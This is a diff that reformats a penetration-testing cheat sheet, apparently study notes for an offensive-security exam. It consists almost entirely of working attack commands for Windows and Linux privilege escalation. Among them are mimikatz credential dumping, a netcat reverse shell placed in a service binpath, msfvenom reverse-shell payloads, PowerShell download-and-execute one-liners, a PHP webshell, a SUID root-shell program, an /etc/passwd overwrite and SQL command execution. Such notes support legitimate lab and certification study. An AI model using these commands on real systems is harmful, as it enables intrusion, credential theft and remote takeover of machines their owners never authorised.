@@ -491,206 +491,206 @@ https://github.com/sleventyeleven/linuxprivchecker/
 
 # Priv-Esc (Windows) Check-List
 #### Basic System Information
-○ systeminfo
-○ whoami; echo %username; hostname
-○ net user
-○ net localgroup
-○ net use
-● Processes
-○ tasklist /v /fi "username eq system"
-○ schtasks /query /fo LIST /v
-● Password hashes
-○ wce -w; fgdump; mimikatz.exe
-● Network
-○ arp -a
-○ ipconfig /all
-○ netstat -ano
-○ netstat -nr
-○ route print
-● Firewall
-○ netsh firewall show state
-○ netsh firewall show config
-○ netsh firewall add portopening TCP 80 "Open Port 80"
+- systeminfo
+- whoami; echo %username; hostname
+- net user
+- net localgroup
+- net use
+#### Processes
+- tasklist /v /fi "username eq system"
+- schtasks /query /fo LIST /v
+#### Password hashes
+- wce -w; fgdump; mimikatz.exe
+#### Network
+- arp -a
+- ipconfig /all
+- netstat -ano
+- netstat -nr
+- route print
+#### Firewall
+- netsh firewall show state
+- netsh firewall show config
+- netsh firewall add portopening TCP 80 "Open Port 80"
 
 
 #### Services
 https://toshellandback.com/2015/11/24/ms-priv-esc/
-● Services we can modify binpath
-○ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+#### Services we can modify binpath
+- accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 (weak service permissions for all authenticated users)
-○ accesschk.exe -uwcqv "John" * -accepteula (weak service
+- accesschk.exe -uwcqv "John" * -accepteula (weak service
 permissions for specific user)
 
-○ sc qc upnphost
-○ sc config upnphost binpath= "C:\Inetpub\nc.exe
+- sc qc upnphost
+- sc config upnphost binpath= "C:\Inetpub\nc.exe
 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
 ■ OR “net user /add” OR a msfvenom revshell (vbs or exe)
-○ sc config upnphost obj= ".\LocalSystem" password= ""
-○ sc config upnphost depend= ""
-○ Sc upnphost stop; sc upnphost start
-● Unquoted Service Paths - race condition
-○ wmic service get name,displayname,pathname,startmode |findstr /i "Auto"
+- sc config upnphost obj= ".\LocalSystem" password= ""
+- sc config upnphost depend= ""
+- Sc upnphost stop; sc upnphost start
+#### Unquoted Service Paths - race condition
+- wmic service get name,displayname,pathname,startmode |findstr /i "Auto"
 |findstr /i /v "C:\Windows\\" |findstr /i /v """
-○ icacls c:\program\SLMail\
-○ msfvenom -f exe -o pop3.exe
-● Further service enumeration
-○ net start
-○ tasklist /SVC
-○ sc query state= all
-○ sc qc upnphost
-○ Get-WmiObject win32_service | select Name, DisplayName, State, PathName | Out-File
-○ dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
-● Always Install Elevated
-○ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-○ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-○ Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
-○ msiexec /quiet /qn /I c:evil.msi
-● Credential search
-○ findstr /si password *.txt/xml/ini
-○ dir /s *pass* == *cred* == *vnc* == *.config*
-○ findstr /spin "password" *.*
-○ reg query HKLM /f password /t REG_SZ /s
-○ reg query HKLM /f password /t REG_SZ /s
-○ Look for unattend(ed) and sysprep xml/ini files
+- icacls c:\program\SLMail\
+- msfvenom -f exe -o pop3.exe
+#### Further service enumeration
+- net start
+- tasklist /SVC
+- sc query state= all
+- sc qc upnphost
+- Get-WmiObject win32_service | select Name, DisplayName, State, PathName | Out-File
+- dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
+#### Always Install Elevated
+- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+- Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
+- msiexec /quiet /qn /I c:evil.msi
+#### Credential search
+- findstr /si password *.txt/xml/ini
+- dir /s *pass* == *cred* == *vnc* == *.config*
+- findstr /spin "password" *.*
+- reg query HKLM /f password /t REG_SZ /s
+- reg query HKLM /f password /t REG_SZ /s
+- Look for unattend(ed) and sysprep xml/ini files
 ■ C:\Windows\Panther\
 ■ C:\Windows\Panther\Unattend\
 ■ C:\Windows\System32\
 ■ C:\Windows\System32\sysprep\
 #### Accesschk - file permissions
 
-○ accesschk.exe -uwdqs Users c:
-○ accesschk.exe -uwdqs "Authenticated Users" c:\ (weak folder permissions)
-○ accesschk.exe -uwqs Users c:*.*
-○ accesschk.exe -uwqs "Authenticated Users" c:*.* (weak file permissions)
+- accesschk.exe -uwdqs Users c:
+- accesschk.exe -uwdqs "Authenticated Users" c:\ (weak folder permissions)
+- accesschk.exe -uwqs Users c:*.*
+- accesschk.exe -uwqs "Authenticated Users" c:*.* (weak file permissions)
 
 #### Scripts
-○ https://github.com/pentestmonkey/windows-privesc-check
-○ https://github.com/GDSSecurity/Windows-Exploit-Suggester
-○ https://github.com/M4ximuss/Powerless
-○ https://github.com/rasta-mouse/Sherlock
+- https://github.com/pentestmonkey/windows-privesc-check
+- https://github.com/GDSSecurity/Windows-Exploit-Suggester
+- https://github.com/M4ximuss/Powerless
+- https://github.com/rasta-mouse/Sherlock
 #### Precompiled exploits
 
-○ https://github.com/SecWiki/windows-kernel-exploits/
-○ https://github.com/abatchy17/WindowsExploits
+- https://github.com/SecWiki/windows-kernel-exploits/
+- https://github.com/abatchy17/WindowsExploits
 
 #### Powershell
-○ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
+- powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
 -NoProfile -File file.ps1
-○ powershell.exe -nop -exec bypass -c "IEX (New-Object
+- powershell.exe -nop -exec bypass -c "IEX (New-Object
 Net.WebClient).DownloadString('http://10.10.14.19:8080/PowerUp.ps1'
 );Invoke-AllChecks"
-○ echo "IEX(New-Object
+- echo "IEX(New-Object
 Net.WebClient).DownloadString('http://10.10.14.19:8080/Sherlock.ps1
 ')" | powershell -noprofile -
 
 # Priv-Esc (Linux) Check-List
-● OS – Version and Architecture
-○ uname –a
-○ cat /etc/*-release
-○ lsb_release –a (Debian)
-● Current user and privileges
-○ id
-○ pwd
-○ sudo -l
-● Find SUID files that are world-writable (or cronjob)
-○ find / -perm -u=s -type f 2>/dev/null
-○ find / -perm -g=s -type f 2>/dev/null
+#### OS – Version and Architecture
+- uname –a
+- cat /etc/*-release
+- lsb_release –a (Debian)
+#### Current user and privileges
+- id
+- pwd
+- sudo -l
+#### Find SUID files that are world-writable (or cronjob)
+- find / -perm -u=s -type f 2>/dev/null
+- find / -perm -g=s -type f 2>/dev/null
 ■ SUID Directory Traversal PATH=/exploit/code/path/$exploit
 
-● Find cronjob files that are world-writable
+#### Find cronjob files that are world-writable
 
-○ cat /etc/crontab & /etc/cron.d & /etc/*cron*
-○ find / -perm -2 -type f 2>/dev/null
+- cat /etc/crontab & /etc/cron.d & /etc/*cron*
+- find / -perm -2 -type f 2>/dev/null
 ■ gcc -o /tmp/setsuid /tmp/setsuid.c
 ■ chmod u+s setsuid
-● Look for privileged NFS Mounts
-○ Cat /etc/exports
-○ Writable Mountpoint: Mount to folder, copy compiled SUID.c to folder, chmod u+s, run.
-○ showmount -e 192.168.1.101
-○ mount 192.168.1.101:/ /tmp/
-○ Often SUID C binary files are required to spawn a shell as a superuser, you can update
+#### Look for privileged NFS Mounts
+- Cat /etc/exports
+- Writable Mountpoint: Mount to folder, copy compiled SUID.c to folder, chmod u+s, run.
+- showmount -e 192.168.1.101
+- mount 192.168.1.101:/ /tmp/
+- Often SUID C binary files are required to spawn a shell as a superuser, you can update
 the UID / GID and shell as required..
 int main(void){
 setresuid(0, 0, 0);
 system("/bin/bash");
 }
 gcc -o suid suid.c
-● What users are on the machine?
-○ cat /etc/passwd
+#### What users are on the machine?
+- cat /etc/passwd
 ■ echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
-○ grep –vE “nologin|false” /etc/passwd
-● What processes are currently running?
-○ ps aux | grep root
-○ netstat –antup
-● Scripts:-
-○ https://github.com/sleventyeleven/linuxprivchecker/
-○ https://github.com/mzet-/linux-exploit-suggester
-○ https://github.com/pentestmonkey/unix-privesc-check
-○ https://github.com/rebootuser/LinEnum
+- grep –vE “nologin|false” /etc/passwd
+#### What processes are currently running?
+- ps aux | grep root
+- netstat –antup
+#### Scripts:-
+- https://github.com/sleventyeleven/linuxprivchecker/
+- https://github.com/mzet-/linux-exploit-suggester
+- https://github.com/pentestmonkey/unix-privesc-check
+- https://github.com/rebootuser/LinEnum
 
 # Tips and Tricks
 
-Windows Searching:
-● Dir C:\Windows /S *cmd*
-● Dir C:\Windows\System32 /Q | find “BOB”
+#### Windows Searching:
+``` Dir C:\Windows /S *cmd*
+``` Dir C:\Windows\System32 /Q | find “BOB”
 
-msfvenom formats
-● exe, elf, c
-● python, perl, asp, JavaScript, war
-● js_le, (javascript, little endian)
+``` msfvenom formats
+``` exe, elf, c
+``` python, perl, asp, JavaScript, war
+``` js_le, (javascript, little endian)
 Webshells
-● /usr/share/webshells/
-● Pikachu.gif.php
-● <? php echo system($_REQUEST['cmd']); ?>
+``` /usr/share/webshells/
+``` Pikachu.gif.php
+``` <? php echo system($_REQUEST['cmd']); ?>
 Reverse-shell One-liners
-● http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-○ Try first, then last, then 2,3,4...
-○ whereis netcat | which nc
+#### http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- Try first, then last, then 2,3,4...
+- whereis netcat | which nc
 
-Windows Transfer
-● certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe
-● Smbserver.py leshare . → Copy \\10.10.14.19\leshare\accesschk.exe
-● https://www.abatchy.com/2017/03/powershell-download-file-one-liners
-● (new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe",
+# Windows Transfer
+``` certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe
+``` Smbserver.py leshare . → Copy \\10.10.14.19\leshare\accesschk.exe
+``` https://www.abatchy.com/2017/03/powershell-download-file-one-liners
+``` (new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe",
 "C:\lec\accesschk.exe")
-● Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"
-Windows Tricks
-● SMB Server
-○ smbserver.py leshare /var/www/html
+``` Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"
+# Windows Tricks
+#### SMB Server
+- smbserver.py leshare /var/www/html
 ■ Copy \\10.10.12.84\leshare\scripts\Powerless.bat
 ■ \\10.10.12.84\leshare\exploits\Windows\MS14.exe
 ■ Rundll32.exe \\10.10.12.84\leshare\go.dll,0
 
-● Python PSExec (and more at /usr/share/impacket)
-○ psexec.py user:passwd@10.10.10.152 whoami
-○ psexec.py user:passwd@10.10.10.152 -c python <cmd>
+# Python PSExec (and more at /usr/share/impacket)
+- psexec.py user:passwd@10.10.10.152 whoami
+- psexec.py user:passwd@10.10.10.152 -c python <cmd>
 
-msfvenom payloads
-● msfvenom -l payloads
-● msfvenom -p java/jsp_shell_reverse_tcp --payload-options
-● msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war
+# msfvenom payloads
+``` msfvenom -l payloads
+``` msfvenom -p java/jsp_shell_reverse_tcp --payload-options
+``` msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war
 > runme.war
 Useful file Locations
 Webshell locations:
-● /usr/share/webshells
+``` /usr/share/webshells
 
-Password lists:
-● /usr/share/wordlists/fasttrack.txt (222)
-● /usr/share/wordlists/dirb/small.txt (900)
-● /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt (1244)
-● /usr/share/seclists/Passwords/probable-v2-top(207-12000)
-● /usr/share/wordlists/dirb/common.txt (4614)
-● /usr/share/wordlists/nmap.lst (5084)
-● /usr/share/wordlists/metasploit/password.lst (88396)
+# Password lists:
+``` /usr/share/wordlists/fasttrack.txt (222)
+``` /usr/share/wordlists/dirb/small.txt (900)
+``` /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt (1244)
+``` /usr/share/seclists/Passwords/probable-v2-top(207-12000)
+``` /usr/share/wordlists/dirb/common.txt (4614)
+``` /usr/share/wordlists/nmap.lst (5084)
+``` /usr/share/wordlists/metasploit/password.lst (88396)
 Directory lists:
-● /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-● /usr/share/seclists/Discovery/Web-Content/common.txt
-● /usr/share/seclists/Discovery/Web-Content/quickhits.txt
-● /usr/share/seclists/Discovery/Web-Content/CGIs.txt
-● /usr/share/seclists/Discovery/Web-Content/raft-*
+``` /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+``` /usr/share/seclists/Discovery/Web-Content/common.txt
+``` /usr/share/seclists/Discovery/Web-Content/quickhits.txt
+``` /usr/share/seclists/Discovery/Web-Content/CGIs.txt
+``` /usr/share/seclists/Discovery/Web-Content/raft-*
 Fuzzing lists:
-● /usr/share/seclists/Fuzzing
-● /usr/share/wfuzz/wordlist
+``` /usr/share/seclists/Fuzzing
+``` /usr/share/wfuzz/wordlist
 Shell Spawning
 which python; which python3
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -706,7 +706,7 @@ perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 
-SUID Privileged Binaries
+#### SUID Privileged Binaries
 cp,mv: replace /etc/passwd to add a user or SSH key.
 less,more: !bash
 man man: !bash
@@ -718,6 +718,7 @@ exec "/bin/sh" (IRB)
 :!bash (vi)
 :set shell=/bin/bash:shell (vi)
 !sh (nmap)
+
 Custom code running other binaries - PATH manipulation:
 If you are running a SUID which executes a shared binary (e.g., cat), we can manipulate the PATH variable to run
 our own file which we call cat.
@@ -725,39 +726,42 @@ echo “/bin/bash” > /tmp/cat
 chmod +x /tmp/cast
 export PATH=/tmp:$PATH
 ./runcatSUID
-Another trick is to create a reverse shell with msfvenom and place that in the set PATH
+
+  Another trick is to create a reverse shell with msfvenom and place that in the set PATH
 (msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell)
 Execute OS Commands from within SQL
-SQL:
+
+ SQL:
 \! whoami
 sys_exec('chown john.john /etc/shadow')
 SELECT sys_exec("net users lecon lecon /add");
 MSSQL:
 EXEC xp_cmdshell 'dir *.exe';
 GO
+  
 If your stuck:
-● Vector
-○ Enumerate more... FROM THE TOP, do NOT SKIP ANY STEPS!!
-○ When enumerating use more than one wordlist! (i.e., gobuster); also -
+#### Vector
+- Enumerate more... FROM THE TOP, do NOT SKIP ANY STEPS!!
+- When enumerating use more than one wordlist! (i.e., gobuster); also -
 did you check robots.txt?
-○ page?=foo - TRY MORE HARDER for LFI/RFI/SQL UNION
+- page?=foo - TRY MORE HARDER for LFI/RFI/SQL UNION
 
-○ Creds - If you have any usernames, throw them at other services, use
+- Creds - If you have any usernames, throw them at other services, use
 fasttrack.lst and the enumd username variations as password.
 
-● Shell
-○ Test basic connectivity by using raw netcat to verify connection back
-○ Use basic ports for egress: 80/443/25/53
-○ Use basic payload: windows/shell_reverse_tcp
-○ Speak the language the machine wants to, not what is convenient.
+#### Shell
+- Test basic connectivity by using raw netcat to verify connection back
+- Use basic ports for egress: 80/443/25/53
+- Use basic payload: windows/shell_reverse_tcp
+- Speak the language the machine wants to, not what is convenient.
 
 
 Interesting files to look for via LFI/Traversal (REMEMBER TO USE nullbyte ‘%00’ to
 terminate serverside for LFI)
-● Windows
-○ C:\boot.ini
-○ WINDOWS\System32\drivers\etc\hosts
-○ WINDOWS/system32/prodspec.ini
+#### Windows
+- ```C:\boot.ini```
+- ```WINDOWS\System32\drivers\etc\hosts```
+- ```WINDOWS/system32/prodspec.ini```
 
 # Essential Reading
 
